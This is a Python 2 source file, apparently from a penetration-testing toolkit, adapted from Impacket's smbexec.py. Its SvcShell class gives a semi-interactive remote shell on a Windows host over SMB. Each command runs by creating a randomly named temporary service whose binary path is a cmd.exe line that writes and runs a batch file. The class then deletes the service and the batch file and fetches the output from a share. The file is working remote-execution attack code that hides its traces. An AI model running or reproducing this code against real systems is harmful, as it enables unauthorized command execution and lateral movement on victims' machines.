#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
# -*- Mode: python -*-

from lib.common import *

################################################################
# Code borrowed and adapted from Impacket's smbexec.py example #
################################################################
class SvcShell(cmd.Cmd):
    def __init__(self, svc, mgr_handle, rpc, smbserver_share, mode='SHARE', display=True):
        cmd.Cmd.__init__(self)

        self.__svc = svc
        self.__mgr_handle = mgr_handle
        self.__rpc = rpc
        self.__mode = mode
        self.__display = display
        self.__smbserver_share = smbserver_share
        self.__output_file = '%s.txt' % ''.join(random.choice(string.letters) for _ in range(8))
        self.__batch_filename = '%s.bat' % ''.join([random.choice(string.letters) for _ in range(8)])

        if self.__mode == 'SERVER':
            self.__batchFile = ntpath.join('%TEMP%', self.__batch_filename)
        else:
            self.__batchFile = ntpath.join(DataStore.share_path, self.__batch_filename)
            self.__output_file_path = ntpath.join(DataStore.share_path, self.__output_file)

        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c'
        self.__service_name = ''.join([random.choice(string.ascii_lowercase) for _ in range(8)])

        self.transferClient = self.__rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on
        self.transferClient.setTimeout(100000)

        if self.__mode == 'SERVER':
            self.__local_ip = self.transferClient.getSMBServer().get_socket().getsockname()[0]

    def __output_callback(self, data):
        self.__outputBuffer += data

    def cmdloop(self):
        logger.info('Launching semi-interactive OS shell')
        logger.debug('Going to use temporary service %s' % self.__service_name)

        self.execute_command('cd ')

        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer, '\r\n', '') + '>'
            self.__outputBuffer = ''

        cmd.Cmd.cmdloop(self)

    def emptyline(self):
        return False

    def default(self, line):
        if line != '':
            self.send_data(line)

    def do_shell(self, command):
        process = Popen(command, shell=True, stdout=PIPE, stderr=STDOUT)
        stdout, _ = process.communicate()

        if stdout is not None:
            print stdout

    def do_exit(self, line):
        return True

    def get_output(self):
        if self.__mode == 'SERVER':
            fd = open(os.path.join(tempfile.gettempdir(), self.__output_file), 'r')
            self.__output_callback(fd.read())
            fd.close()
            os.unlink(os.path.join(tempfile.gettempdir(), self.__output_file))
        else:
            self.transferClient.getFile(DataStore.writable_share, self.__output_file, self.__output_callback)
            self.transferClient.deleteFile(DataStore.writable_share, self.__output_file)

    def execute_command(self, command):
        if self.__mode == 'SERVER':
            command = '%s echo %s ^> \\\\%s\\%s\\%s > %s & %s %s' % (self.__shell, command, self.__local_ip, self.__smbserver_share, self.__output_file, self.__batchFile, self.__shell, self.__batchFile)
        else:
            command = '%s echo %s ^> %s > %s & %s %s' % (self.__shell, command, self.__output_file_path, self.__batchFile, self.__shell, self.__batchFile)

        command += ' & del %s' % self.__batchFile

        logger.debug('Creating service with executable path: %s' % command)

        resp = scmr.hRCreateServiceW(self.__svc, self.__mgr_handle, '%s\x00' % self.__service_name, '%s\x00' % self.__service_name, lpBinaryPathName='%s\x00' % command)
        self.__service_handle = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__svc, self.__service_handle)
        except:
           pass

        scmr.hRDeleteService(self.__svc, self.__service_handle)
        scmr.hRCloseServiceHandle(self.__svc, self.__service_handle)
        self.get_output()

    def send_data(self, data):
        self.execute_command(data)
        DataStore.cmd_stdout = self.__outputBuffer

        if self.__display:
            print self.__outputBuffer

        self.__outputBuffer = ''
